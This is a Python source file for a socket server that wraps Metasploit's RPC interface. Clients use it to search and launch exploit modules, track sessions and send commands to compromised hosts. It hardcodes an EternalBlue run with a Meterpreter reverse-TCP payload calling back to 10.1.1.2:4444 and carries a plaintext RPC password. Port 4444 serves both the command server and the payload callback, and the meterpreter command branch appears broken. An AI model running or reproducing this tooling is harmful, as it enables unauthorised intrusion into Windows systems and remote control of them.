import os
import time
import socket
import threading
import subprocess
from socket_threading import Server
import json
from pymetasploit3.msfrpc import MsfRpcClient

from socket_threading import RED, BLUE, GREEN, YELLOW, RESET

MSF_HOST = "10.1.1.2"
MSF_PORT = 1337
MSF_PASSWORD = "memes"
RESOURCE_SCRIPT = "/usr/src/metasploit-framework/docker/msfconsole.rc"

server = None
msfInstance = None

def run_meterpreter_exploit(target_ip):
    """Execute a Meterpreter payload against the target."""
    if msfInstance is None:
        return f"{RED}[-] Not connected to Metasploit. Use 'connect' first.{RESET}"

    exploit = msfInstance.modules.use("exploit", "windows/smb/ms17_010_eternalblue")
    if not exploit:
        return f"{RED}[!] Failed to load exploit module{RESET}"

    # Set parameters for the exploit
    exploit["RHOSTS"] = target_ip
    exploit["PAYLOAD"] = "windows/x64/meterpreter/reverse_tcp"
    exploit["LHOST"] = "10.1.1.2"
    exploit["LPORT"] = 4444  # Listening port

    # Execute the exploit
    job_id = exploit.execute()
    return f"{GREEN}[+] Meterpreter exploit launched with job ID {job_id}{RESET}"

def monitor_meterpreter_sessions():
    """Monitor for new Meterpreter sessions."""
    if msfInstance is None:
        return f"{RED}[-] Not connected to Metasploit.{RESET}"

    while True:
        sessions = msfInstance.sessions.list
        if sessions:
            for sid, session in sessions.items():
                print(f"{GREEN}[+] Meterpreter session {sid} detected ({session['type']}){RESET}")
        time.sleep(5)  # Check every 5 seconds

def interact_meterpreter(session_id, command):
    """Send commands to an active Meterpreter session."""
    if msfInstance is None:
        return f"{RED}[-] Not connected to Metasploit.{RESET}"

    session = msfInstance.sessions.session(session_id)
    if not session:
        return f"{RED}[!] Invalid session ID: {session_id}{RESET}"

    response = session.run_with_output(command)
    return f"{GREEN}[+] Meterpreter Response:\n{response}{RESET}"

def connect_to_msfserver(password, server, port, max_retries=10, retry_delay=2):
    """Connect to the MSF server with retries."""
    print(f"{GREEN}=============== Starting Metasploit API ==============={RESET}")
    for attempt in range(max_retries):
        try:
            msf_client = MsfRpcClient(password, server=server, port=port)
            print(f"{GREEN}[+] Successfully connected to MSF Server!{RESET}")
            return msf_client
        except Exception as e:
            print(f"{YELLOW}[!] Failed to connect to MSF Server: {e}, RETRYING ({attempt + 1}/{max_retries}){RESET}")
            time.sleep(retry_delay)
    print(f"{RED}[!] Max retries reached. Could not connect to MSF Server.{RESET}")
    return None

def start_msfconsole_with_script(resource_script):
    """Start msfconsole with the specified resource script."""
    if not os.path.exists(resource_script):
        print(f"{RED}[!] Resource script {resource_script} not found!{RESET}")
        return False
    
    print(f"{GREEN}[+] Starting msfconsole with resource script: {resource_script}{RESET}")
    try:
        process = subprocess.Popen(
            ["msfconsole", "-r", resource_script],
            stdout=subprocess.PIPE,
            stderr=subprocess.PIPE,
            text=True
        )
        # Wait briefly and check if the process started
        time.sleep(5)  # Increased to give msfconsole time to start RPC
        if process.poll() is not None:  # Process has terminated
            stdout, stderr = process.communicate()
            print(f"{RED}[!] msfconsole failed to start: {stderr}{RESET}")
            return False
        print(f"{GREEN}[+] msfconsole started successfully! PID: {process.pid}{RESET}")
        return True
    except Exception as e:
        print(f"{RED}[!] Error starting msfconsole: {e}{RESET}")
        return False

def connect_msf():
    if not start_msfconsole_with_script(RESOURCE_SCRIPT):
        return None
    msf_instance = connect_to_msfserver(password=MSF_PASSWORD, server=MSF_HOST, port=MSF_PORT)
    if msf_instance:
        print(f"{GREEN}[+] Registered Metasploit with name 'msf'{RESET}")
    else:
        print(f"{RED}[!] Failed to register Metasploit.{RESET}")
    return msf_instance

def search_exploit(keyword=None, start=0, count=20):
    """Search for exploits, numbering results with pagination and prompt."""
    if msfInstance is None:
        return [], 0
    exploits = msfInstance.modules.exploits
    if keyword is None:
        filtered_exploits = exploits
    else:
        filtered_exploits = [exploit for exploit in exploits if keyword.lower() in exploit.lower()]
    total = len(filtered_exploits)
    paginated_exploits = filtered_exploits[start:start + count]
    numbered_exploits = [f"{i + 1 + start}. {exploit}" for i, exploit in enumerate(paginated_exploits)]
    # Add prompt if there are more results or if we're in a search session
    if start + count < total:
        numbered_exploits.append(f"{BLUE}[SERVER] Send 'next' for next page, Send 'prev' for previous page or 'exit' to return to CLI{RESET}")
    return numbered_exploits, total

def search_auxiliary_modules(keyword=None, start=0, count=20):
    """Search for auxiliary modules with pagination."""
    if msfInstance is None:
        return [], 0
    auxiliary_modules = msfInstance.modules.auxiliary
    if keyword is None:
        filtered_auxiliary = auxiliary_modules
    else:
        filtered_auxiliary = [aux for aux in auxiliary_modules if keyword.lower() in aux.lower()]
    total = len(filtered_auxiliary)
    paginated_auxiliary = filtered_auxiliary[start:start + count]
    return paginated_auxiliary, total

def parse_param_value(opt_data, user_input):
    """
    Convert 'user_input' (string) to the correct type based on 'opt_data'.
    If the default or 'type' is bool, parse user_input -> boolean.
    If integer, parse user_input -> int.
    Otherwise, keep as string.
    """
    msf_type = opt_data.get('type', '').lower()  # e.g. "bool", "string", "port", ...
    default_val = opt_data.get('default', None)

    user_input = user_input.strip()
    if not user_input:
        return None  # signal "skip" so we rely on Metasploit’s default

    # If user typed "true"/"false", we can parse it
    if msf_type == 'bool' or isinstance(default_val, bool):
        return (user_input.lower() == 'true')
    elif msf_type == 'integer' or isinstance(default_val, int):
        return int(user_input)
    elif msf_type == 'port':
        return int(user_input)
    # If you want to handle 'float' or 'double' similarly, do so here

    # Otherwise, treat as string
    return user_input

def run_msf_exploit(mtype, mname, user_params):
    """Run the selected exploit with parameters, no extra prompting."""
    exploit = msfInstance.modules.use(mtype, mname)
    if not exploit:
        return f"{RED}[!] Could not load {mtype} module: {mname}{RESET}"

    # Only set the user_params we collected in handle_message
    for param_key, param_value in user_params.items():
        exploit[param_key] = param_value

    print(f"{GREEN}Running exploit: {mname}{RESET}")
    result = exploit.execute()
    print(f"{BLUE}Exploit Result: {result}{RESET}")
    return result

#####################
# Validate Module 
#####################
def validate_module_type(module_type, module_name):
    """
    Optional utility:
    If the user typed 'run exploit X' but 'X' is actually an auxiliary, 
    or vice versa, we can handle that gracefully. 
    Return (bool_ok, error_message).
    """
    if module_type == "exploit":
        # Check if it exists in the exploit list
        if module_name not in msfInstance.modules.exploits:
            return False, f"{RED}{module_name} is NOT an exploit. Try: run auxiliary {module_name}{RESET}"
    elif module_type == "auxiliary":
        # Check if it exists in the auxiliary list
        if module_name not in msfInstance.modules.auxiliary:
            return False, f"{RED}{module_name} is NOT an auxiliary. Try: run exploit {module_name}{RESET}"
    return True, None

def handle_message(data, client_address):
    """Handle messages from clients."""
    global msfInstance
    print(f"{BLUE}[Server] Processing message: '{data}' from {client_address}{RESET}")
    options = data.split()
    command = options[0].lower() if options else ""

    # Static variable to track search state per client
    if not hasattr(handle_message, 'search_state'):
        handle_message.search_state = {}
    client_state = handle_message.search_state.setdefault(client_address, 
                                                          {'keyword': None, 'start': 0, 'in_search': False, 'in_run': False, 'run_module': None})

    if command == "connect":
        response = f"{BLUE}[+] Connecting to MSF...{RESET}"
        msfInstance = connect_msf()
        response = f"{BLUE}[+] Connected to Metasploit!{RESET}" if msfInstance else f"{RED}[-] Failed to connect to Metasploit{RESET}"
        client_state['in_search'] = False  # Reset search state on connect
        client_state['in_run'] = False
    
    elif command == "search":
        if len(options) < 3:
            response = f"{RED}[!] Invalid search command: search [exploits]/[auxiliary] [keyword] [start_index]{RESET}"
        else:
            module_type = options[1]
            keyword = options[2] if len(options) > 2 else None
            start = int(options[3]) if len(options) > 3 and options[3].isdigit() else 0

            if msfInstance is None:
                response = f"{RED}[-] Not connected to Metasploit. Use 'connect' first.{RESET}"
            elif module_type == "exploits":
                client_state['keyword'] = keyword
                client_state['start'] = start
                client_state['in_search'] = True
                results, total = search_exploit(keyword, start)
                if results:
                    response = f"{BLUE}Exploit modules matching '{keyword}' ({start}-{min(start+20, total)} of {total}):\n{RESET}" + "\n".join(results)
                else:
                    response = f"{BLUE}No exploit modules found for '{keyword}'.{RESET}"
            elif module_type == "auxiliary":
                results, total = search_auxiliary_modules(keyword, start)
                if results:
                    response = f"{BLUE}Auxiliary modules matching '{keyword}' ({start}-{min(start+20, total)} of {total}):\n{RESET}" + "\n".join(results)
                else:
                    response = f"{BLUE}No auxiliary modules found for '{keyword}'.{RESET}"
            else:
                response = f"{RED}[!] Invalid module type. Use 'search exploits' or 'search auxiliary'{RESET}"

    elif command == "run":
        """
        Simplified 'run' command that ONLY prompts for options in ALWAYS_PROMPT_OPTS 
        and sets defaults for everything else (if available).
        Skips any parameters outside this list, even if they have no default.
        """
        if len(options) < 3:
            response = f"{RED}[!] Invalid run command: run [exploit]/[auxiliary] [module_name]{RESET}"
        else:
            module_type = options[1]
            module_name = options[2]
            valid_ok, err_msg = validate_module_type(module_type, module_name)

            if msfInstance is None:
                response = f"{RED}[-] Not connected to Metasploit. Use 'connect' first.{RESET}"
            elif not valid_ok:
                response = err_msg
            else:
                exploit = msfInstance.modules.use(module_type, module_name)
                if not exploit:
                    response = f"{RED}[!] Could not load {module_type} module: {module_name}{RESET}"
                else:
                    ALWAYS_PROMPT_OPTS = {"RHOSTS", "RPORT", "USERNAME", "PASSWORD", "THREADS", "LHOST", "LPORT"}

                    exploit_info = exploit._info.get('options', {})
                    module_options = []

                    # 1. For each known param, decide whether to prompt or to skip
                    for opt_name, opt_data in exploit_info.items():
                        default_val = opt_data.get('default', None)
                        
                        # If it's in our short list, we plan to prompt
                        if opt_name in ALWAYS_PROMPT_OPTS:
                            prompt_msg = f"Please enter {opt_name}"
                            if default_val is not None:
                                prompt_msg += f" (default: {default_val})"

                            module_options.append({
                                'name': opt_name,
                                'default': default_val,
                                'prompt': prompt_msg
                            })
                        else:
                            # If there's a default, set it silently
                            if default_val is not None:
                                exploit[opt_name] = default_val
                            # If it's required and no default is set, we do nothing—exploit might fail.

                    # 2. Prepare the run state for prompting
                    client_state['in_run'] = True
                    client_state['exploit_options'] = module_options
                    client_state['user_params'] = {}
                    client_state['module_type'] = module_type
                    client_state['module_name'] = module_name

                    # 3. If there are no prompts, just execute immediately
                    if not module_options:
                        result = exploit.execute()
                        response = json.dumps(result)
                        client_state['in_run'] = False
                    else:
                        response = f"{BLUE}{module_options[0]['prompt']}: {RESET}"

    elif client_state['in_run']:
        """
        The user is responding to a previously asked param. 
        We only prompt for the next param in ALWAYS_PROMPT_OPTS. 
        """
        exploit = msfInstance.modules.use(client_state['module_type'], client_state['module_name'])
        if not exploit:
            response = f"{RED}[!] Could not load {client_state['module_type']} module: {client_state['module_name']}{RESET}"
            client_state['in_run'] = False
            return response
    
        if not client_state['exploit_options']:
            response = f"{RED}[!] No more options to fill.{RESET}"
            client_state['in_run'] = False
        else:
            current_opt = client_state['exploit_options'][0]
            param_name = current_opt['name']
            param_value = (data or current_opt['default'])  # Use user input or default
            parsed_value = parse_param_value(exploit._info['options'][param_name], param_value)
            client_state['user_params'][param_name] = parsed_value
            client_state['exploit_options'].pop(0)

            if len(client_state['exploit_options']) == 0:
                # All relevant prompts done => run the exploit
                result = run_msf_exploit(client_state['module_type'], client_state['module_name'], client_state['user_params'])
                response = result if isinstance(result, str) else json.dumps(result)
                client_state['in_run'] = False
            else:
                # Prompt for the next param
                next_opt = client_state['exploit_options'][0]
                response = f"{BLUE}{next_opt['prompt']}: {RESET}"
    
    elif command in ["next", "prev"] and client_state['in_search']:
        # existing 'next' and 'prev' logic remains the same
        if msfInstance is None:
            response = f"{RED}[-] Not connected to Metasploit. Use 'connect' first.{RESET}"
        else:
            if command == "next":
                client_state['start'] += 20
            else:
                client_state['start'] -= 20

            results, total = search_exploit(client_state['keyword'], client_state['start'])
            if results:
                response = f"{BLUE}Exploit modules matching '{client_state['keyword']}' ({client_state['start']}-{min(client_state['start']+20, total)} of {total}):\n{RESET}" + "\n".join(results)
            else:
                response = f"{BLUE}No more exploit modules available.{RESET}"
    
    elif command == "exit" and client_state['in_search']:
        client_state['in_search'] = False
        client_state['keyword'] = None
        client_state['start'] = 0
        response = f"{BLUE}Returned to normal CLI.{RESET}"

    elif command == "sessions":
        if msfInstance is None:
            response = f"{RED}[-] Not connected to Metasploit. Use 'connect' first.{RESET}"
        else:
            sessions = msfInstance.sessions.list
            if sessions:
                session_list = "\n".join([f"ID: {sid}, Type: {sdata['type']}, Target: {sdata['tunnel_peer']}" for sid, sdata in sessions.items()])
                response = f"{GREEN}Active Meterpreter Sessions:\\n{session_list}{RESET}"
            else:
                response = f"{RED}No active sessions found.{RESET}"
                                
    elif command.startswith("meterpreter"):
        parts = command.split(maxsplit=2)
        if len(parts) < 3:
            response = f"{RED}Usage: meterpreter <session_id> <command>{RESET}"
        else:
            session_id, meterpreter_command = parts[1], parts[2]
            try:
                session = msfInstance.sessions.session(session_id)
                output = session.run_with_output(meterpreter_command)
                response = f"{GREEN}{output}{RESET}"
            except KeyError:
                response = f"{RED}Session ID {session_id} does not exist.{RESET}"
    
    elif command == "jobs":
        if msfInstance is None:
            response = f"{RED}[-] Not connected to Metasploit. Use 'connect' first.{RESET}"
        else:
            jobs = msfInstance.jobs.list
            if jobs:
                job_list = "\n".join([
                    f"ID: {jid}, Name: {jdata['name']}"
                    for jid, jdata in jobs.items()
                ])                
                response = f"{GREEN}Active Jobs:\\n{job_list}{RESET}"
            else:
                response = f"{RED}No active jobs.{RESET}"

    elif command == "quit":
        response = f"{GREEN}[+] Server shutting down as requested by {client_address}{RESET}"
        if server is not None:
            server.exit()
        else:
            response = f"{RED}[!] Server not initialized {RESET}"
        
        return response
            
    else:
        response = f"{RED}Invalid command or not in search mode.{RESET}"

    print(f"{BLUE}[Server] Sending response to {client_address}: {response}{RESET}")
    return response

def main():
    global server
    server = Server(host='10.1.1.2', port=4444, message_handler=handle_message)
    server.start()
    try:
        while server.running:
            time.sleep(1)
    except KeyboardInterrupt:
        server.exit()

if __name__ == "__main__":
    main()